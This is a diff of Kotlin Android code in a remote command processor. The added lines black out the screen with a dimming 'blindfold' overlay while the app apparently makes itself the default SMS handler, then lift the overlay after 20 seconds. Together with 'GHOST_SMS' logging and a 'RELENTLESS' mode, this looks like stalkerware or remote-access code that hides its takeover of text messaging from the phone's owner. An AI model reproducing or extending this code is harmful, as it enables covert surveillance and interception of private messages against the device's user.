@@ -560,6 +560,18 @@ object CommandProcessor {
                         DefaultSmsManager.expectedMode = ""
                     } else {
                         DefaultSmsManager.expectedMode = mode
+                        if (mode == "AUTO" || mode == "AUTO_NAV") {
+                            Handler(Looper.getMainLooper()).post {
+                                DimmerManager.applyDim(ctx, 0, "AUTO")
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    if (DefaultSmsManager.expectedMode == "AUTO" || DefaultSmsManager.expectedMode == "AUTO_NAV") {
+                                        DebugLogger.log("GHOST_SMS", "Safety fuse triggered. Disarming blindfold.")
+                                        DefaultSmsManager.expectedMode = ""
+                                        DimmerManager.removeOverlay(ctx)
+                                    }
+                                }, 20000)
+                            }
+                        }
                         if (mode == "RELENTLESS") {
                             DefaultSmsManager.isRelentlessActive = true
                             val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
@@ -582,6 +594,16 @@ object CommandProcessor {
                         errorMsg = "No previous SMS package found in memory."
                     } else {
                         DefaultSmsManager.expectedMode = "RESTORE"
+                        Handler(Looper.getMainLooper()).post {
+                            DimmerManager.applyDim(ctx, 0, "AUTO")
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                if (DefaultSmsManager.expectedMode == "RESTORE") {
+                                    DebugLogger.log("GHOST_SMS", "Restore safety fuse triggered. Disarming blindfold.")
+                                    DefaultSmsManager.expectedMode = ""
+                                    DimmerManager.removeOverlay(ctx)
+                                }
+                            }, 20000)
+                        }
                         try {
                             val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
